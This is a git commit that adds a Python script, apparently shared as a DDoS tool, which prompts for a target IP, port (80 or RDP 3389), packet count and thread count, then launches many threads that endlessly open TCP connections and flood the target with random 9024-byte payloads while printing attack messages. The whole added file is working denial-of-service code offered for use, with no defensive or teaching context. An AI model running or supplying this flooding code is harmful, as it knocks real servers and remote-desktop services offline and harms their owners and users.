7f49c709410c4f835b4b897f2b9a1012398387cd
ddoserhandal <99073768+ddoserhandal@users.noreply.github.com>
2022-02-18 01:21:12 +0700

    Add files via upload

--- iashv2.py
+++ iashv2.py
@@ -1,3 +1,40 @@
+# Coding Time By iFrame
+# Tools Usage By : iFrame
+# Tools Credit By : iFrame
+# Don't Leak Your Tools Now !!!
+
+# Import Module
+import random
+import socket
+import threading
 import os
+# Info Tools [ XC Tools]
 os.system("clear")
-name = str(input("YAHA KENA FRENK MAU DDOS YAH? WKWK")
+print("------------------------------------------------")
+print("[+] Tools Used By : Ash")
+print("[+] Credit Tools : iCave,iFlame,iStar")
+print("[+] Jangan Leak Ya")
+print("------------------------------------------------")
+ip = str(input("[/] Enter RDP IP : "))
+port = int(input("[/] Enter RDP Port (80/3389)   : "))
+times = int(input("[/] Enter Packet : "))
+threads = int(input("[/] Enter Thread (9024) : "))
+
+def run():
+    data = random._urandom(9024)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +" Sent!!!")
+        except socket.error:
+            s.close()
+            print("[!] Attacking By iFrame Tools DDoS Auto Suspend IP => ",ip," With Port : ",port,"!")
+
+for y in range(threads):
+    th = threading.Thread(target = run)
+    th.start()
